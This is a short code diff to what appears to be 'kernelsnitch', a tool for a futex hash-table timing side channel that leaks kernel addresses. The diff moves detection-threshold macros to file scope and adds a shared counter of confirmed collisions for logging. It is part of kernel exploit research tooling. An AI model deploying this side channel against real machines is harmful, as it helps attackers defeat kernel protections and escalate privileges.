@@ -86,6 +86,9 @@ struct kernelsnitch_shared_state {
     volatile size_t *times;
     volatile size_t found;
     volatile size_t mm_struct;
+    /* Collisions the last find_collisions pass actually confirmed (shared so
+     * the parent can log per-phase yield). */
+    volatile size_t found_collisions;
 
     pthread_t *tids;
     pthread_t *increase_tids;
@@ -180,6 +183,14 @@ static void __decrease(struct kernelsnitch_shared_state *ks)
 #endif
 #ifndef AVERAGE
 #define AVERAGE (1<<3)
+#endif
+/* File-scope so callers can log the exact detection gate they run under
+ * (target.h may override both; the A55 sets 15/5). */
+#ifndef KERNELSNITCH_THRESHOLD_MULT
+#define KERNELSNITCH_THRESHOLD_MULT 10
+#endif
+#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 #endif
 static int __compare(const void *a, const void *b)
 {
@@ -330,6 +341,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->repeat_measurement = REPEAT_MEASUREMENT;
     ks->average = AVERAGE;
     ks->probe_count = 0;
+    ks->found_collisions = 0;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
@@ -415,12 +427,6 @@ void kernelsnitch_set_search_bounds(
 void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
     #define ID 128
-#ifndef KERNELSNITCH_THRESHOLD_MULT
-#define KERNELSNITCH_THRESHOLD_MULT 10
-#endif
-#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
-#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
-#endif
     size_t count = 0;
     size_t wanted;
     size_t futex_addr;
@@ -480,6 +486,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
         }
     }
+    ks->found_collisions = count;
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
